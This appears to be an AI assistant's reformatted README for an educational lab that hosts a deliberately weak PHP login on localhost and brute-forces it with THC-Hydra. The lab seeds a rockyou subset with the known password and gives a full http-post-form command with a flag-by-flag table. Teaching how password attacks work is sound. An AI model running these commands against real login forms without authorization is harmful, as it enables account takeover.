Here is an optimized, highly efficient, and professionally formatted version of your README file.

The original was a bit cluttered with emojis and redundant terminal navigation steps (like changing directories multiple times). This version uses a clean Markdown structure, standardizes the formatting, and optimizes the commands so users can copy and paste with maximum efficiency.

---

# ⚡ Hydra Lab: HTTP Brute-Force Demo

An educational lab environment demonstrating online password-guessing concepts, detection, and defenses using THC-Hydra against a local PHP development server.

> **⚠️ Disclaimer:** This repository is strictly for educational and authorized testing purposes. Only run these exercises on your local machine, a dedicated virtual machine, a Docker container, or authorized lab environments (e.g., TryHackMe, Hack The Box). Never target public or unauthorized systems.

---

## 🛠️ Environment Setup & Lab Execution

Follow these steps sequentially. Run the commands in **Terminal 1** to set up and host the target, then switch to **Terminal 2** to launch the attack.

### Part 1: Target Setup (Terminal 1)

#### 1. Update Packages & Install Dependencies

Ensure your local package list is fresh and install PHP (for hosting the local target site) along with Hydra.

```bash
sudo apt update && sudo apt install -y php-cli hydra

```

#### 2. Create Workspace & Application File

Create a dedicated workspace directory and generate the vulnerable login portal file (`index.php`).

```bash
mkdir -p ~/hydra-demo && cd ~/hydra-demo

```

Run `nano index.php`, paste the following code, then save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`):

```php
<?php
$correct_user = "demo";
$correct_pass = "password123";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    
    if ($user === $correct_user && $pass === $correct_pass) {
        echo "Login successful. Welcome, " . htmlentities($user) . "!";
    } else {
        echo "Login failed: Invalid username or password.";
    }
    exit;
}
?>
<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <title>Demo Login</title>
</head>
<body>
    <h2>Demo Login</h2>
    <form method="POST" action="index.php">
        <label>Username: <input type="text" name="username"></label><br><br>
        <label>Password: <input type="password" name="password"></label><br><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>

```

#### 3. Start the Web Server

Launch the PHP built-in web server. **Keep this terminal window open** to monitor incoming application logs and POST requests.

```bash
php -S 127.0.0.1:8000

```

---

### Part 2: Attack Configuration (Terminal 2)

#### 4. Prepare the Wordlist

Extract the native Kali Linux password wordlist, generate a shortened 1,000-line subset for efficient execution, and seed it with our known lab password.

```bash
# Decompress rockyou wordlist if it hasn't been done already
[ -f /usr/share/wordlists/rockyou.txt.gz ] && sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Create a fast 1,000-item testing subset
head -n 1000 /usr/share/wordlists/rockyou.txt > ~/rockyou-1000.txt

# Seed the valid password to guarantee a successful match
echo "password123" >> ~/rockyou-1000.txt

```

#### 5. Verify Target Behavior (Pre-Attack Check)

Before pointing Hydra at the target, manually verify that an incorrect login attempt returns the expected failure condition string (`Login failed`). Hydra relies entirely on this substring match to differentiate bad passwords from valid ones.

```bash
curl -s -X POST http://127.0.0.1:8000/index.php -d "username=wrong&password=bad" | grep "Login failed"

```

#### 6. Execute the Hydra Attack

Run Hydra against the local HTTP POST form container using your optimized wordlist.

```bash
hydra -l demo -P ~/rockyou-1000.txt 127.0.0.1 http-post-form \
  "/index.php:username=^USER^&password=^PASS^:Login failed" \
  -s 8000 -t 4 -f -V

```

| Syntax Flag | Purpose |
| --- | --- |
| `-l demo` | Specifies the static target username (`demo`). |
| `-P ~/rockyou-1000.txt` | Path to the custom password wordlist file. |
| `http-post-form` | Instructs Hydra to use the HTTP POST login module. |
| `"/[...]:Login failed"` | The target URI, variable syntax mappings, and the designated failure string. |
| `-s 8000` | Points to the custom network port (8000). |
| `-t 4` | Limits parallel execution to 4 tasks (safeguards local single-threaded PHP server). |
| `-f` | Forces Hydra to stop executing immediately upon finding the first valid credential pair. |
| `-V` | Enables verbose output to view every password attempt in real-time. |

---

Made with ❤️ by **Shafqat Ghafoor** — Happy Hacking!
